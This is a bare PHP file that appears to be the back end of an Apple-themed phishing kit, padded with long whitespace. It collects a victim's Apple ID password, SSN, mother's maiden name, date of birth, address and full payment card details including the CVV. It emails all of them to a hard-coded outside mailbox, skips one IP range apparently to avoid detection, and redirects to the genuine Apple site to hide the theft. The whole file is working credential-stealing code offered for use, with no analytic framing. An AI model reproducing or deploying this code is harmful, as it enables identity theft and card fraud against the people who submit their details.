                                                                                                <?php
$IP = getenv("REMOTE_ADDR");
if ( substr($IP, 0, 7) == "174.123") die;




$appid = $_REQUEST['smxsca1'];
$passid = $_REQUEST['smxsca2'];
$fullid = $_REQUEST['smxsca3'];
$dayid = $_REQUEST['smxsca4'];
$dayid1 = $_REQUEST['smxsca5'];
$dayid2 = $_REQUEST['smxsca6'];
$adressid = $_REQUEST['smxsca8'];
$phoneid = $_REQUEST['smxsca9'];
$zipid = $_REQUEST['smxsca10'];
$motherid = $_REQUEST['smxsca23'];
$ssnid = $_REQUEST['smxsca22'];
$ccid = $_REQUEST['smxsca11'];
$expid = $_REQUEST['smxsca12'];
$expid1 = $_REQUEST['smxsca13'];
$cvvid = $_REQUEST['smxsca14'];
$ncid = $_REQUEST['smxsca25'];

$data = "Apple ID : $appid\r\n";
$data.= "Password : $passid\r\n";
$data.= "Full Name : $fullid\r\n";
$data.= "DOB : $dayid/$dayid1/$dayid2\r\n";
$data.= "Address : $adressid\r\n";
$data.= "Zip Code : $zipid\r\n";
$data.= "MMN : $motherid\r\n";
$data.= "Phone : $phoneid\r\n";
$data.= "SSN : $ssnid\r\n";
$data.= "Name On Card : $ncid\r\n";
$data.= "Card Number : $ccid\r\n";
$data.= "Expiry Date : $expid/$expid1\r\n";
$data.= "CVV : $cvvid\r\n";
$data.= "IP : $IP - $appid\r\n";
mail("eng.karam1993@yahoo.com","$fullid from $adressid",$data);

echo "<meta http-equiv='refresh' content='0;url=http://appleid.apple.com'>";
?>

                            
                            
                            